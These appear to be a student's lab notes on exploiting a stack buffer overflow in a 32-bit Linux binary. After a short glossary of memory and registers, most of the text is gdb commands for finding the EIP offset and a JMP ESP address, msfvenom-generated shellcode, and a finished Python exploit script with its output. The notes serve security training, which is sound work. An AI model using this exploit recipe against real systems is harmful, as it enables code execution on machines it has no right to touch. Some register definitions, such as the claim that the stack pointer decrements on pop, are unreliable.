

Heap – memory that can be allocated and deallocated as needed.
      - allocated memory to the stack

Stack – a contiguous section of memory used for passing arguments to other functions and general housekeeping.

Registers – Storage elements as close as possible to the central processing unit (CPU). There are many uses and types of registers, but in simple terms, general purpose registers can be used for whatever function is desired, that is fetching the contents of something from memory and placing it in the register for some computation/comparison, or special purpose registers such as the Instruction Pointer (IP), or Stack Pointer (SP) which are discussed below.

Instruction Pointer (IP) – (AKA Program Counter (PC) contains the address of next instruction to be executed. When the instruction is executed, it increments to the next instruction unless the instruction transfers control to another location by replacing the contents of the IP with the address of the next command to be executed through the process of jumping, calling, or returning.

Stack Pointer (SP) – Contains the address of the next available space on the stack. The x86 architecture utilizes a top-down stack. When an item is saved on the stack (using a push command), it will be placed in the location addressed by the SP, after which, the SP will be decremented. When an item is fetched from the stack (using a pop instruction), the SP is decremented and then the item is retrieved from the address pointed to by the SP.

Base Pointer (BP) – The base of the stack. Used to ensure that items placed on the stack can be referenced using an offset relative to the BP. Because each function is provided a portion of the stack, it can be used to ensure that the function does not address items outside the bounds of their area on the stack. When there is nothing on the stack the BP will equal SP.

Function - Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient. Functions can be written within the program or can exist outside of the main program through the processing of linking (accessing code outside the main program). When a function allocates space for variables, those variables are placed on the stack, so when the function completes and returns back to the calling function, access to those.

Shellcode – The code that is executed once an exploit successfully takes advantage of a vulnerability. Shellcode often provides a shell to the actor, but it doesn’t have to. Whatever the intended effect is, is written in the shellcode.


gdb <file>

info functions
pdisass main
pdisass getuserinput
run 
  -input string-
shows the Heap locations and were issues are

to find offset
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
wiremask eu buffer overflow generator

input random string
copy EIP address fault at the registry value, put in invalid $PC address: 0x31634130
Offset of 62, so EIP is 62 characters

env - gdb ./func
(gdb) show env
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) show env         
(gdb) run
-inputrandomlongstring-
(gdb) info proc map
search until right after heap
start seach from after heap, to the end of the stack, look for jump 0xff, 0xe4 for ESP
      hex for JUMP ESP
(gdb) find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
        <after heap>, <very end of stack>
grab first 3 addresses
invert from big endian to little endian
      ex. 0xf7de3b59 -> "\x59\x3b\xde\xf7"

create payload with msfvenom
 msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 69 (iteration=0)
x86/shikata_ga_nai chosen with final size 69
Payload size: 69 bytes
Final size of python file: 353 bytes
buf =  b""
-vvv use here vvv-
buf += b"\xbf\xb2\xfe\xf9\x3a\xdb\xce\xd9\x74\x24\xf4\x5d"            
buf += b"\x29\xc9\xb1\x0b\x31\x7d\x14\x03\x7d\x14\x83\xed"
buf += b"\xfc\x50\x0b\x93\x31\xcc\x6d\x36\x20\x84\xa0\xd4"
buf += b"\x25\xb3\xd3\x35\x45\x53\x24\x22\x86\xc1\x4d\xdc"
buf += b"\x51\xe6\xdc\xc8\x65\xe8\xe0\x08\x1d\x80\x8f\x69"
buf += b"\x8c\x39\x50\x3d\x1d\x30\xb1\x0c\x21"                        
-^^^ to here ^^^-
       -for payload
##FINISHED SCRIPT###
student@lin-ops:~$ cat func.buff.py
#!/usr/bin/python2.7

buf = "A" * 62 #get us to the EIP register
'''
0xf7 de 4b 59 -> "\x59\x3b\xde\xf7"


'''
buf += "\x59\x3b\xde\xf7 " #set of instructions for JMP ESP

buf +="\x90" * 10

#payload here
#msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
buf += b"\xbf\xb2\xfe\xf9\x3a\xdb\xce\xd9\x74\x24\xf4\x5d"
buf += b"\x29\xc9\xb1\x0b\x31\x7d\x14\x03\x7d\x14\x83\xed"
buf += b"\xfc\x50\x0b\x93\x31\xcc\x6d\x36\x20\x84\xa0\xd4"
buf += b"\x25\xb3\xd3\x35\x45\x53\x24\x22\x86\xc1\x4d\xdc"
buf += b"\x51\xe6\xdc\xc8\x65\xe8\xe0\x08\x1d\x80\x8f\x69"
buf += b"\x8c\x39\x50\x3d\x1d\x30\xb1\x0c\x21"

print(buf)

###END SCRIPT###

./func <<<$(./func.buff.py)
-result-
student
(because we made a whoami payload with msfvenom)




